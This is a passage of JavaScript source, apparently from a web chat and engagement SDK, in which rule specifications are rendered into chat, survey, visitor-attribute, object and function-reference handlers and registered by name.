    } else {
      return RENDERINGCONTEXT.C2CM.requestExtLauncher(rule, RENDERINGCONTEXT.CHM.CHAT_TYPES[serviceType], function (rule) {
        return result;
      });
    }
  };
  addToJssdkRenderer('RenderShowExternalChat', RenderShowExternalChat);
  var RenderShowProactive = function (spObj, rule, evt, extraArgs) {
    var result = {
      rule: rule,
      chatType: RENDERINGCONTEXT.CHM.CHAT_TYPES[spObj.serviceType],
      chatSpec: RenderChatSpec(spObj.chatSpec, rule, evt, extraArgs)
    };
    if ("agtid" in spObj) result.agtid = spObj.agtid;
    if ("action" in spObj) result.onAgentAssigned = function (evt) {
      RenderActions(spObj.action, rule, evt, extraArgs);
    };
    if ("useNative" in spObj) result.useNative = spObj.useNative;
    if ("fabFile" in spObj) result.fabPlugin = spObj.fabFile;
    return RENDERINGCONTEXT.SL1.c(result).request();
  };
  addToJssdkRenderer('RenderShowProactive', RenderShowProactive);
  var RenderShowSurvey = function (ssObj, rule, evt, extraArgs) {
    var svy = ssObj.survey;
    var survey = {};
    if ("surveySpecId" in svy.surveyId) survey.surveyId = RenderAbstractNumber(svy.surveyId.surveySpecId, rule, evt, extraArgs);else survey.surveyId = RenderAbstractString(svy.surveyId.surveySpecStringId, rule, evt, extraArgs);
    if ("surveySpecOverride" in svy) {
      survey.surveySpecOverride = {};
      if ("x" in svy.surveySpecOverride) survey.surveySpecOverride.x = RenderAbstractNumber(svy.surveySpecOverride.x, rule, evt, extraArgs);
      if ("y" in svy.surveySpecOverride) survey.surveySpecOverride.y = RenderAbstractNumber(svy.surveySpecOverride.y, rule, evt, extraArgs);
      if ("w" in svy.surveySpecOverride) survey.surveySpecOverride.w = RenderAbstractNumber(svy.surveySpecOverride.w, rule, evt, extraArgs);
      if ("h" in svy.surveySpecOverride) survey.surveySpecOverride.h = RenderAbstractNumber(svy.surveySpecOverride.h, rule, evt, extraArgs);
      if ("surveyID" in svy.surveySpecOverride) survey.surveySpecOverride.surveyID = svy.surveySpecOverride.surveyID;
      if ("name" in svy.surveySpecOverride) survey.surveySpecOverride.name = RenderAbstractString(svy.surveySpecOverride.name, rule, evt, extraArgs);
      if ("altURL" in svy.surveySpecOverride) survey.surveySpecOverride.altURL = RenderAbstractString(svy.surveySpecOverride.altURL, rule, evt, extraArgs);
      survey.surveySpecOverride["_end"] = svy.surveySpecOverride["_end"];
    } else survey.surveySpecOverride = null;
    if ("preSurveyData" in svy) {
      if ("abstractMap" in svy.preSurveyData) survey.preSurveyData = RenderAbstractMap(svy.preSurveyData.abstractMap, rule, evt, extraArgs);
      if ("abstractObject" in svy.preSurveyData) survey.preSurveyData = RenderAbstractObject(svy.preSurveyData.abstractObject, rule, evt, extraArgs);
    } else survey.preSurveyData = null;
    if ("windowFeatures" in svy) survey.windowFeatures = RenderAbstractString(svy.windowFeatures, rule, evt, extraArgs);else survey.windowFeatures = null;
    if ("surveyRequestUrl" in svy) survey.surveyRequestUrl = RenderAbstractString(svy.surveyRequestUrl, rule, evt, extraArgs);else survey.surveyRequestUrl = null;
    survey.keysurveyInHouseReporting = svy.keysurveyInHouseReporting;
    survey.nativePostChat = svy.nativePostChat;
    survey.richPostChat = svy.richPostChat;
    return RENDERINGCONTEXT.SVYM.showSurvey(survey.surveyId, rule, survey.surveySpecOverride, survey.preSurveyData, survey.windowFeatures, survey.abstractString, survey.keysurveyInHouseReporting, survey.nativePostChat, evt, survey.richPostChat);
  };
  addToJssdkRenderer('RenderShowSurvey', RenderShowSurvey);
  var RenderUnblockService = function (ubsObj, rule, evt, extraArgs) {
    var value = ["ALL"];
    if ("services" in ubsObj) value = RenderAbstractList(ubsObj.services, rule, evt, extraArgs);
    return Inq.unblockServices(value);
  };
  addToJssdkRenderer('RenderUnblockService', RenderUnblockService);
  var RenderUpdateXframe = function (uxfObj, rule, evt, extraArgs) {
    if (RENDERINGCONTEXT.CHM.isChatInProgress()) {
      return RENDERINGCONTEXT.FP.updateXFrameFromBizRule(RenderAbstractString(uxfObj.layerid, rule, evt, extraArgs), RenderAbstractString(uxfObj.url, rule, evt, extraArgs), rule.getBusinessUnitID());
    }
  };
  addToJssdkRenderer('RenderUpdateXframe', RenderUpdateXframe);
  var RenderVerifyToken = function (verifyTokenObj, rule, evt, extraArgs) {
    var result = {};
    if ("tokenId" in verifyTokenObj) {
      result.tokenId = RenderAbstractString(verifyTokenObj.tokenId, rule, evt, extraArgs);
      return RENDERINGCONTEXT.ROM.verifyToken(result.tokenId);
    } else {
      throw "RenderVerifyToken: Missing tokenId in verifyTokenObj";
    }
  };
  addToJssdkRenderer('RenderVerifyToken', RenderVerifyToken);
  var RenderVisitorAttributesAction = function (vaaObj, rule, evt, extraArgs) {
    var functionName = vaaObj.functionName;
    if ("duration" in vaaObj) {
      return RENDERINGCONTEXT.VAM[functionName](RenderVisitorAttributes(vaaObj.visitorAttributes, rule, evt, extraArgs), RenderAbstractNumber(vaaObj.duration, rule, evt, extraArgs));
    }
    return RENDERINGCONTEXT.VAM[functionName](RenderVisitorAttributes(vaaObj.visitorAttributes, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderVisitorAttributesAction', RenderVisitorAttributesAction);
  var RenderSetEngagementAttributes = function (sdvObj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.CHM.setEngagementAttributes(RenderAttributes(sdvObj.value, rule, evt));
  };
  addToJssdkRenderer('RenderSetEngagementAttributes', RenderSetEngagementAttributes);
  var RenderAttribute = function (attrObj, rule, evt) {
    var result = {};
    result["name"] = attrObj.name;
    result["value"] = encodeURIComponent(RenderAbstractString(attrObj.value, rule, evt));
    return result;
  };
  addToJssdkRenderer('RenderAttribute', RenderAttribute);
  var RenderAttributes = function (attrArr, rule, evt) {
    var returnArr = [];
    for (var i = 0; i < attrArr.length; i++) {
      returnArr.push(RenderAttribute(attrArr[i], rule, evt));
    }
    return returnArr;
  };
  addToJssdkRenderer('RenderAttributes', RenderAttributes);
  var RenderAbstractItemObj = function (abstractItemObj, rule, evt) {
    var itm = RenderAbstractItem(abstractItemObj.item, rule, evt);
    var result = itm;
    try {
      if (abstractItemObj["js-fun"] == "Date") {
        result = new Date(itm);
      } else if (abstractItemObj["js-fun"] == "parseFloat") {
        result = parseFloat(itm);
      }
    } catch (error) {
      throw "RenderAbstractItemObj: eval item error. Item:  " + abstractItemObj.item;
    }
    return result;
  };
  var RenderAbstractItem = function (itemObj, rule, evt, extraArgs) {
    if (itemObj.type == "AbstractDate") {
      return RenderAbstractDate(itemObj.item, rule, evt, extraArgs);
    } else if (itemObj.type == "AbstractFunction") {
      return RenderAbstractFunction(itemObj.item, false);
    } else if (itemObj.type == "AbstractNumber") {
      return RenderAbstractNumber(itemObj.item, rule, evt, extraArgs);
    } else if (itemObj.type == "AbstractString") {
      return RenderAbstractString(itemObj.item, rule, evt, extraArgs);
    } else if (itemObj.type == "AbstractList") {
      return RenderAbstractList(itemObj.item, rule, evt, extraArgs);
    } else if (itemObj.type == "AbstractCondition") {
      return RenderAbstractCondition(itemObj.item, rule, evt, extraArgs);
    } else if (itemObj.type == "AbstractMap") {
      return RenderAbstractMap(itemObj.item, rule, evt, extraArgs);
    } else if (itemObj.type == "AbstractObject") {
      return RenderAbstractObject(itemObj.item, rule, evt, extraArgs);
    } else if (itemObj.type == "ObjectAccess") {
      return RenderObjectAccess(itemObj, rule, evt, extraArgs);
    } else if (itemObj.type == "ObjectDeref") {
      return RenderObjectDeref(itemObj, rule, evt, extraArgs);
    } else if (itemObj.type == "MapGet") {
      return RenderMapGet(itemObj, rule, evt, extraArgs);
    } else if (itemObj.type == "JsFunctionResultType") {
      return RenderJsFunctionResultType(itemObj, rule, evt, extraArgs);
    } else if (itemObj.type == "ValueIf") {
      return RenderValueIf(itemObj, rule, evt, extraArgs);
    } else if (itemObj.type == "Null") {
      return RenderNull(itemObj, rule, evt, extraArgs);
    } else if (itemObj.type == "Undefined") {
      return RenderUndefined(itemObj, rule, evt, extraArgs);
    }
    throw "RenderAbstractItem: Unexpected item type: " + itemObj.value;
  };
  addToJssdkRenderer('RenderAbstractItemObj', RenderAbstractItemObj);
  addToJssdkRenderer('RenderAbstractItem', RenderAbstractItem);
  var RenderAbstractMutable = function (obj, target, rule, evt, extraArgs) {
    if (obj.type == "Remove") {
      return RenderRemoveMemberId(obj, target, rule, evt, extraArgs);
    } else if (obj.type == "Set") {
      return RenderSetMemberId(obj, target, rule, evt, extraArgs);
    } else {
      throw "RenderAbstractMutable: Unexpected mutable type: " + obj.value;
    }
  };
  addToJssdkRenderer('RenderAbstractMutable', RenderAbstractMutable);
  var RenderAbstractObject = function (obj, rule, evt, extraArgs) {
    if (obj.type == "C2CIframe") {
      return RenderC2CIframeDiv(obj, rule, evt, extraArgs);
    } else if (obj.type == "ObjectCreate") {
      return RenderObjectCreate(obj, rule, evt, extraArgs);
    } else if (obj.type == "PersistentCustomerId") {
      return RenderPersistentCustomerId(obj, rule, evt);
    } else if (obj.type == "ObjectModification") {
      return RenderObjectModification(obj, rule, evt, extraArgs);
    } else if (obj.type == "ObjectMerge") {
      return RenderObjectMerge(obj, rule, evt, extraArgs);
    } else if (obj.type == "JsObject") {
      return RenderJsObject(obj, rule, evt, extraArgs);
    } else if (obj.type == "SimpleObject") {
      return RenderSimpleObject(obj, rule, evt, extraArgs);
    } else if (obj.type == "VariableRefType") {
      return RenderVariableRefType(obj, rule, evt, extraArgs);
    } else if (obj.type == "ObjectAccess") {
      return RenderObjectAccess(obj, rule, evt, extraArgs);
    } else if (obj.type == "ObjectDeref") {
      return RenderObjectDeref(obj, rule, evt, extraArgs);
    } else if (obj.type == "MapGet") {
      return RenderMapGet(obj, rule, evt, extraArgs);
    } else if (obj.type == "JsFunctionResultType") {
      return RenderJsFunctionResultType(obj, rule, evt, extraArgs);
    } else if (obj.type == "ValueIf") {
      return RenderValueIf(obj, rule, evt, extraArgs);
    } else if (obj.type == "Null") {
      return RenderNull(obj, rule, evt, extraArgs);
    } else if (obj.type == "Undefined") {
      return RenderUndefined(obj, rule, evt, extraArgs);
    } else if (obj.type == "AbstractNumber") {
      return RenderAbstractNumber(obj.item, rule, evt, extraArgs);
    }
    throw "RenderAbstractObject: Unexpected Object type: " + obj.value;
  };
  addToJssdkRenderer('RenderAbstractObject', RenderAbstractObject);
  var RenderC2CIframeDiv = function (obj, rule, evt, extraArgs) {
    return RENDERINGCONTEXT.MI8.mixAbsorber(RenderAbstractItem(obj.item, rule, evt, extraArgs)).absorb({
      iframeDomain: RenderAbstractString(obj.iframeDomain, rule, evt, extraArgs)
    });
  };
  addToJssdkRenderer('RenderC2CIframeDiv', RenderC2CIframeDiv);
  var RenderJsObject = function (obj, rule, evt, extraArgs) {
    if (obj.noSafe) {
      return JSSDK_HELPER.helperInlineJSFunction[obj.jsVarHash]();
    } else {
      return RENDERINGCONTEXT.FM.callExternalHelperSafe("JSSDK_HELPER.helperInlineJSFunction." + obj.jsVarHash);
    }
  };
  addToJssdkRenderer('RenderJsObject', RenderJsObject);
  var RenderJsVarType = function (obj) {
    var result;
    if (obj.noSafe) {
      result = JSSDK_HELPER.helperInlineJSFunction[obj.jsVarHash]();
    } else {
      result = RENDERINGCONTEXT.FM.callExternalHelperSafe("JSSDK_HELPER.helperInlineJSFunction." + obj.jsVarHash);
    }
    if ("extraHash" in obj) {
      result = JSSDK_HELPER.helperInlineJSFunction[obj.extraHash](result);
    }
    return result;
  };
  addToJssdkRenderer('RenderJsVarType', RenderJsVarType);
  var RenderJsRefType = function (obj) {
    var result;
    if (obj.noSafe) {
      result = obj.jsVar.split('.').reduce(reducer, window);
    } else {
      result = obj.jsVar.split('.').reduce(reducer, window.parent);
    }
    function reducer(obj, i) {
      return obj[i];
    }
    return result;
  };
  addToJssdkRenderer('RenderJsRefType', RenderJsRefType);
  var RenderRemoveMemberId = function (obj, target, rule, evt, extraArgs) {
    return target.remove(RenderAbstractString(obj.memberId, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderRemoveMemberId', RenderRemoveMemberId);
  var RenderSetMemberId = function (obj, target, rule, evt, extraArgs) {
    return target.set(RenderAbstractString(obj.memberId, rule, evt, extraArgs), RenderAbstractItem(obj.item, rule, evt, extraArgs));
  };
  addToJssdkRenderer('RenderSetMemberId', RenderSetMemberId);
  var RenderObjectCreate = function (obj, rule, evt, extraArgs) {
    var muteResult;
    if ("objectExpression" in obj) {
      muteResult = RENDERINGCONTEXT.MI8.mixMutatable(JSSDK_HELPER.helperGlobalObjects[obj.objectExpression]);
    } else {
      muteResult = RENDERINGCONTEXT.MI8.mixMutatable();
    }
    if ("member" in obj) {
      var member = [];
      for (var i = 0; i < obj.member.length; i++) {
        member[i] = obj.member[i];
        muteResult = muteResult.set(RenderAbstractString(member[i].memberId, rule, evt, extraArgs), RenderAbstractItem(member[i].memberItem, rule, evt, extraArgs));
      }
    }
    return RENDERINGCONTEXT.MI8.unmixMutatable(muteResult);
  };
  addToJssdkRenderer('RenderObjectCreate', RenderObjectCreate);
  var RenderObjectMerge = function (obj, rule, evt, extraArgs) {
    var absortResult = RENDERINGCONTEXT.MI8.mixAbsorber(RenderAbstractObject(obj.first, rule, evt, extraArgs));
    var arr = [];
    for (var i = 0; i < obj.objects.length; i++) {
      arr[i] = obj.objects[i];
      absortResult = absortResult.absorb(RenderAbstractObject(arr[i], rule, evt, extraArgs));
    }
    return absortResult;
  };
  addToJssdkRenderer('RenderObjectMerge', RenderObjectMerge);
  var RenderObjectModification = function (obj, rule, evt, extraArgs) {
    var muteResult = RENDERINGCONTEXT.MI8.mixMutatable(RenderAbstractItem(obj.target, rule, evt, extraArgs));
    for (var i = 0; i < obj.omList.length; i++) {
      var item = obj.omList[i];
      muteResult = RenderAbstractMutable(item, muteResult, rule, evt, extraArgs);
    }
    return RENDERINGCONTEXT.MI8.unmixMutatable(muteResult);
  };
  addToJssdkRenderer('RenderObjectModification', RenderObjectModification);
  var RenderPersistentCustomerId = function (obj, rule, evt) {
    return RENDERINGCONTEXT.getPersistCustID();
  };
  addToJssdkRenderer('RenderPersistentCustomerId', RenderPersistentCustomerId);
  var RenderSimpleObject = function (obj, rule, evt, extraArgs) {
    var result = {},
      val,
      id;
    for (var key in obj.value) {
      if (Object.prototype.hasOwnProperty.call(obj.value, key)) {
        if (key.startsWith("abstractString")) {
          val = RenderAbstractString(obj.value[key], rule, evt, extraArgs);
        } else if (key.startsWith("abstractNumber")) {
          val = RenderAbstractNumber(obj.value[key], rule, evt, extraArgs);
        } else if (key.startsWith("abstractCondition")) {
          val = RenderAbstractCondition(obj.value[key], rule, evt, extraArgs);
        } else {
          id = RenderAbstractString(obj.value[key], rule, evt, extraArgs);
        }
        if (val !== null && typeof val !== "undefined" && id) {
          result[id] = val;
          val = null;
          id = null;
        }
      }
    }
    return result;
  };
  addToJssdkRenderer('RenderSimpleObject', RenderSimpleObject);
  var RenderVariableRefType = function (numberObj, rule, evt, extraArgs) {
    var result;
    if ("ruleId" in numberObj) {
      result = RENDERINGCONTEXT.PM.getVar(RenderAbstractString(numberObj.varId, rule, evt, extraArgs), RENDERINGCONTEXT.BRM.rb41(RenderAbstractNumber(numberObj.ruleId, rule, evt, extraArgs)));
    } else {
      if (!rule) {
        ;
      }
      result = RENDERINGCONTEXT.PM.getVar(RenderAbstractString(numberObj.varId, rule, evt, extraArgs), rule);
    }
    if ("isVarGetValue" in numberObj) {
      if (!result) {
        throw "RenderVariableRefType: result is null for object: " + numberObj.varId;
      }
      return result.getValueOrDefault();
    }
    return result;
  };
  addToJssdkRenderer('RenderVariableRefType', RenderVariableRefType);
  var RenderContentGroup = function (obj, rule, evt) {
    var returnObj = [];
    returnObj.push(RenderAbstractList(obj["include-ids"], rule, evt));
    returnObj.push(RenderAbstractList(obj["include-cgids"], rule, evt));
    returnObj.push(function isIncludedURL(url) {
      var result = false;
      for (var i = 0; i < obj["include-urls"].length; i++) {
        var item = obj["include-urls"][i];
        result = result || RenderStringCompareOp(url, item, rule, evt);
      }
      return result;
    });
    returnObj.push(RenderAbstractList(obj["exclude-cgids"], rule, evt));
    returnObj.push(function isExcludedURL(url) {
      var result = false;
      for (var i = 0; i < obj["exclude-urls"].length; i++) {
        var item = obj["exclude-urls"][i];
        result = result || RenderStringCompareOp(url, item, rule, evt);
      }
      return result;
    });
    return returnObj;
  };
  addToJssdkRenderer('RenderContentGroup', RenderContentGroup);
  var RenderContentGroups = function (obj, rule, evt) {
    var returnObj = {};
    for (var key in obj) {
      returnObj[key] = RenderContentGroup(obj[key], rule, evt);
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderContentGroups', RenderContentGroups);
  var RenderCustomEvents = function (obj, rule, evt) {
    var eventArray = [];
    for (let idx = 0; idx < obj.length; idx++) {
      let item = obj[idx];
      var evItem = {};
      evItem.name = RenderAbstractString(item.name);
      evItem.getEvtData = function (rule, evt) {
        if ("eventDef" in item) {
          return RENDERINGCONTEXT.MI8.mixAbsorber(RenderEvtDataDef(item.eventDef, rule, evt)).absorb(evt);
        } else {
          return RENDERINGCONTEXT.MI8.mixAbsorber({}).absorb(evt);
        }
      };
      if ("aliases" in item) {
        var aliasArray = [];
        for (let aliasIdx = 0; aliasIdx < item.aliases.length; aliasIdx++) {
          var aliasObj = {};
          aliasObj.name = item.aliases[aliasIdx].name;
          aliasObj.getEvtData = function (rule, evt) {
            if ("evtDataDef" in item.aliases[aliasIdx]) {
              return RenderEvtDataDef(item.aliases[aliasIdx].evtDataDef, rule, evt);
            }
            return {};
          };
          aliasArray.push(aliasObj);
        }
        evItem.aliases = aliasArray;
      }
      eventArray.push(new RENDERINGCONTEXT.EXCBTT(evItem));
    }
    return eventArray;
  };
  addToJssdkRenderer('RenderCustomEvents', RenderCustomEvents);
  var RenderEvtDataDef = function (obj, rule, evt) {
    var result = {};
    for (var key in obj.value) {
      result[RenderAbstractString(key, rule, evt)] = RenderAbstractItem(obj.value[key], rule, evt);
    }
    return result;
  };
  addToJssdkRenderer('RenderEvtDataDef', RenderEvtDataDef);
  var RenderAbstractFunction = function (functionObj, returnDetails) {
    var funcReturn;
    if (functionObj.type == "JsFunctionRef") {
      funcReturn = RenderJsFunctionRef(functionObj);
    } else if (functionObj.type == "JsFunctionAnonymous") {
      funcReturn = RenderJsFunctionAnonymous(functionObj);
    } else if (functionObj.type == "JsFunctionByName") {
      funcReturn = RenderJsFunctionByName(functionObj);
    } else {
      throw "RenderAbstractFunction: Unexpected Function type: " + functionObj.value;
    }
    if (returnDetails) {
      return funcReturn;
    } else {
      if ("refEval" in funcReturn) {
        return funcReturn.refEval;
      } else {
        return funcReturn.func;
      }
    }
  };
  var RenderAbstractFunctionForWebSDK = function (functionObj, returnDetails) {
    if (functionObj.type == "JsFunctionByName") {
      return RenderJsFunctionByName(functionObj);
    } else {
      throw "RenderAbstractFunction: Unexpected Function type: " + functionObj.value;
    }
  };
  addToJssdkRenderer('RenderAbstractFunction', RenderAbstractFunction);
  addToJssdkRenderer('RenderAbstractFunctionForWebSDK', RenderAbstractFunctionForWebSDK);
  var RenderJsFunctionAnonymous = function (functionObj) {
    return {
      func: JSSDK_HELPER.helperInlineJSFunction[functionObj.functionHash],
      name: "JSSDK_HELPER.helperInlineJSFunction." + functionObj.functionHash
    };
  };
  addToJssdkRenderer('RenderJsFunctionAnonymous', RenderJsFunctionAnonymous);
  var RenderJsFunctionByName = function (jsFnObj) {
    return {
      func: RENDERINGCONTEXT.FM.getFcn(jsFnObj.jsFnName),
      name: "JSSDK_HELPER.helperGlobalJSFunctions." + jsFnObj.jsFnName,
      actualName: jsFnObj.jsFnName
    };
  };
  addToJssdkRenderer('RenderJsFunctionByName', RenderJsFunctionByName);
  var RenderJsFunctionRef = function (fcnRefObj) {
    var funcName = "JSSDK_HELPER.helperGlobalJSFunctions." + fcnRefObj.refId;
    if ("refEval" in fcnRefObj) {
      return {
        refEval: RENDERINGCONTEXT.FM.callExternalHelper(funcName),
        func: RENDERINGCONTEXT.FM.getFcn(fcnRefObj.refId),
        name: funcName
      };
    } else {
      return {
        func: RENDERINGCONTEXT.FM.getFcn(fcnRefObj.refId),
        name: funcName
      };
    }
  };
  addToJssdkRenderer('RenderJsFunctionRef', RenderJsFunctionRef);
  var RenderJsFunctionResultType = function (obj, rule, evt, extraArgs) {
    var returnDetails = true;
    var funcResult = RenderAbstractFunction(obj.abstrFunc, returnDetails);
    var func = funcResult.func;
    var funcName = funcResult.name;
    var args = [];
    if ("params" in obj) {
      args = RenderAbstractList(obj.params, rule, evt, extraArgs);
    }
    var applyArgs = [null];
    for (var i = 0; i < args.length; i++) {
      applyArgs.push(args[i]);
    }
    if (obj.frameworkContextOnly || v3Lander.isWebSDK) {
      applyArgs[0] = func;
      return RENDERINGCONTEXT.FM.exec.apply(RENDERINGCONTEXT.FM, applyArgs);
    } else {
      applyArgs[0] = funcName;
      return RENDERINGCONTEXT.FM.callExternalHelper.apply(RENDERINGCONTEXT.FM, applyArgs);
    }
  };
  addToJssdkRenderer('RenderJsFunctionResultType', RenderJsFunctionResultType);
  var RenderJsFunctions = function (functionObjs) {
    var funcsObj = {};
    for (var idx = 0; idx < functionObjs.length; idx++) {
      var item = functionObjs[idx];
      funcsObj[item] = RenderJsFunction(item);
    }
    return funcsObj;
  };
  var RenderJsFunction = function (fcnName) {
    return JSSDK_HELPER.helperGlobalJSFunctions[fcnName];
  };
  addToJssdkRenderer('RenderJsFunctions', RenderJsFunctions);
  addToJssdkRenderer('RenderJsFunction', RenderJsFunction);
  var RenderDataCallByParams = function (jsFnObj, rule, evt, extraArgs) {
    if (v3Lander.isWebSDK) {
      var args = [];
      if ("params" in jsFnObj) {
        args = RenderAbstractList(jsFnObj.params, rule, evt, extraArgs);
      }
      if (jsFnObj.funcName) {
        FrameBridge.executeFunctionByName(jsFnObj.funcName, args);
      } else {
        FrameBridge.reguestPageData(args);
      }
    }
  };
  addToJssdkRenderer('RenderDataCallByParams', RenderDataCallByParams);
  var RenderDomDataCall = function (jsFnObj, rule, evt, extraArgs) {
    if (v3Lander.isWebSDK) {
      var args = [];
      if ("params" in jsFnObj) {
        args = RenderAbstractList(jsFnObj.params, rule, evt, extraArgs);
      }
      FrameBridge.requestDomData(args);
    }
  };
  addToJssdkRenderer('RenderDomDataCall', RenderDomDataCall);
  var RenderPostFuncCall = function (jsFnObj, rule, evt, extraArgs) {
    if (v3Lander.isWebSDK) {
      var args = [];
      if ("params" in jsFnObj) {
        args = RenderAbstractList(jsFnObj.params, rule, evt, extraArgs);
      }
      if (jsFnObj.funcName) {
        FrameBridge.postFunctionByName(jsFnObj.funcName, args);
      }
    }
  };
  addToJssdkRenderer('RenderPostFuncCall', RenderPostFuncCall);
  var RenderAgentGroup = function (obj) {
    return obj;
  };
  addToJssdkRenderer('RenderAgentGroup', RenderAgentGroup);
  var RenderDataFilterView = function (dataFilterViewObj) {
    var resultObj = RENDERINGCONTEXT.DFV.c(RenderAbstractString(dataFilterViewObj[0]), function () {
      if ("filter" in dataFilterViewObj[1]) {
        return RenderAbstractFunction(dataFilterViewObj[1].filter, false);
      } else {
        return JSSDK_HELPER.helperInlineJSFunction[dataFilterViewObj[1]['js-filter']];
      }
    }(), RenderAbstractString(dataFilterViewObj[2]), dataFilterViewObj[3]);
    return resultObj;
  };
  addToJssdkRenderer('RenderDataFilterView', RenderDataFilterView);
  var RenderDataFilterViews = function (dataFilterViewsObj) {
    var resultObj = {};
    for (var key in dataFilterViewsObj) {
      resultObj[key] = RenderDataFilterView(dataFilterViewsObj[key]);
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderDataFilterViews', RenderDataFilterViews);
  var RenderEmbeddedTheme = function (obj, rule, evt, extraArgs) {
    var returnObj = {};
    if ("id" in obj) returnObj.id = RenderAbstractString(obj.id, rule, evt, extraArgs);
    if ("chatTheme" in obj) returnObj.chatTheme = RenderChatTheme(obj.chatTheme, rule, evt, extraArgs);
    return returnObj;
  };
  addToJssdkRenderer('RenderEmbeddedTheme', RenderEmbeddedTheme);
  var RenderObjectAccess = function (obj, rule, evt, extraArgs) {
    var tokens = [];
    if (typeof obj['object-id'] == 'string') tokens = obj['object-id'].split('.');else {
      throw "RenderObjectAccess error: no object-id provided to access";
    }
    var token = tokens[0];
    var known_map = {
      "evt": evt,
      "v3Lander": v3Lander,
      "rule": rule
    };
    var objIns;
    if (extraArgs && obj['object-id'] in extraArgs) {
      objIns = extraArgs[token];
    } else if (token in RENDERINGCONTEXT) {
      objIns = RENDERINGCONTEXT[token];
    } else if (token in known_map) {
      objIns = known_map[token];
    } else if (token in window) {
      objIns = window[token];
    } else if (token == 'window') {
      objIns = window;
    } else {
      throw "RenderObjectAccess error: cannot evaluate and get the object instance: " + obj['object-id'];
    }
    for (var i = 1; i < tokens.length; i++) {
      var subToken = tokens[i];
      if (objIns) objIns = objIns[subToken];else {
        throw "RenderObjectAccess error: cannot evaluate and get the object instance: " + obj['object-id'];
      }
    }
    return JSSDK_HELPER.helperInlineJSFunction[obj['js-func']](objIns);
  };
  addToJssdkRenderer('RenderObjectAccess', RenderObjectAccess);
  var RenderMapGet = function (obj, rule, evt) {
    return RenderAbstractMap(obj.map, rule, evt).get(RenderAbstractItem(obj.item, rule, evt));
  };
  addToJssdkRenderer('RenderMapGet', RenderMapGet);
  var RenderNull = function (obj) {
    return null;
  };
  addToJssdkRenderer('RenderNull', RenderNull);
  var RenderObjectDeref = function (obj, rule, evt) {
    var o = RenderAbstractObject(obj.object, rule, evt);
    return o[obj.expr];
  };
  addToJssdkRenderer('RenderObjectDeref', RenderObjectDeref);
  var RenderPage = function (obj) {
    var result = {};
    result.id = RenderAbstractNumber(obj.id);
    if (obj.mID) {
      result.mID = RenderAbstractString(obj.mID);
    } else {
      result.mID = "";
    }
    if (obj.re) {
      result.re = RenderAbstractString(obj.re);
    } else {
      result.re = "";
      result.sup = obj.sup;
    }
    if ("bUnits" in obj) {
      result.bUnits = [];
      for (idx = 0; idx < obj.bUnits.length; idx++) {
        result.bUnits[idx] = obj.bUnits[idx];
      }
    }
    return result;
  };
  addToJssdkRenderer('RenderPage', RenderPage);
  var RenderPages = function (obj) {
    for (var prop in obj) {
      obj[prop] = RenderPage(obj[prop]);
    }
    return obj;
  };
  addToJssdkRenderer('RenderPages', RenderPages);
  var RenderSurveySpec = function (surveySpecObj) {
    var resultObj = {
      id: RenderAbstractNumber(surveySpecObj.id),
      name: RenderAbstractString(surveySpecObj.name),
      x: surveySpecObj.x,
      y: surveySpecObj.y,
      w: surveySpecObj.w,
      h: surveySpecObj.h,
      altURL: surveySpecObj.altURL
    };
    if (surveySpecObj.hasOwnProperty('surveyID')) resultObj.surveyID = surveySpecObj.surveyID;
    return resultObj;
  };
  addToJssdkRenderer('RenderSurveySpec', RenderSurveySpec);
  var RenderSurveyData = function (surveySpecsObj) {
    var resultObj = {};
    for (var key in surveySpecsObj) {
      resultObj[key] = RenderSurveySpec(surveySpecsObj[key]);
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderSurveyData', RenderSurveyData);
  var RenderUndefined = function (obj) {
    return undefined;
  };
  addToJssdkRenderer('RenderUndefined', RenderUndefined);
  var RenderValueIf = function (obj, rule, evt) {
    return RenderAbstractCondition(obj.condition, rule, evt) ? RenderAbstractItem(obj.ifTrue, rule, evt) : RenderAbstractItem(obj.otherwise, rule, evt);
  };
  addToJssdkRenderer('RenderValueIf', RenderValueIf);
  var RenderAbstractResource = function (resourceObj) {
    if (resourceObj.type == "js-resource") {
      return RenderJsResource(resourceObj);
    } else if (resourceObj.type == "web-resource") {
      return RenderWebResource(resourceObj);
    } else if (resourceObj.type == "cookie-resource") {
      return RenderCookieResource(resourceObj);
    } else if (resourceObj.type == "local-storage-resource") {
      return RenderLocalStorageResource(resourceObj);
    }
    throw "RenderAbstractResources: Unexpected Resource type: " + resourceObj.type;
  };
  addToJssdkRenderer('RenderAbstractResource', RenderAbstractResource);
  var RenderAbstractResources = function (resourcesObj) {
    var returnObj = {};
    for (var i = 0; i < resourcesObj.length; i++) {
      var item = RenderAbstractResource(resourcesObj[i]);
      returnObj[item["resource-id"]] = item["resource"];
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderAbstractResources', RenderAbstractResources);
  var RenderVariable = function (varObj, rule, evt) {
    if (varObj.type == "NumberVariable") {
      return RenderNumberVariable(varObj);
    } else if (varObj.type == "ObjectVariable") {
      return RenderObjectVariable(varObj);
    } else if (varObj.type == "StringVariable") {
      return RenderStringVariable(varObj);
    } else if (varObj.type == "DateVariable") {
      return RenderDateVariable(varObj);
    } else if (varObj.type == "BooleanVariable") {
      return RenderBooleanVariable(varObj);
    } else if (varObj.type == "NumberListVariable") {
      return RenderNumberListVariable(varObj);
    } else if (varObj.type == "StringListVariable") {
      return RenderStringListVariable(varObj);
    } else if (varObj.type == "DateListVariable") {
      return RenderDateListVariable(varObj);
    } else if (varObj.type == "MapVariable") {
      return RenderMapVariable(varObj, rule, evt);
    }
    throw "RenderVariable: Unexpected VER34 type: " + varObj.value;
  };
  addToJssdkRenderer('RenderVariable', RenderVariable);
  var RenderVariables = function (varObj, rule, evt) {
    var result = [];
    for (var i = 0; i < varObj.length; i++) {
      result.push(RenderVariable(varObj[i], rule, evt));
    }
    return result;
  };
  addToJssdkRenderer('RenderVariables', RenderVariables);
  var RenderActionLists = function (actionLists, extraArgs) {
    var resultObj = {};
    if (typeof extraArgs === 'object') {
      extraArgs.initObj = resultObj;
    } else {
      extraArgs = {
        initObj: resultObj
      };
    }
    function addToResultObj(prop) {
      resultObj[prop] = function (rule, evt) {
        return RenderActions(actionLists[prop], rule, evt, extraArgs);
      };
    }
    for (var prop in actionLists) {
      addToResultObj(prop);
    }
    return resultObj;
  };
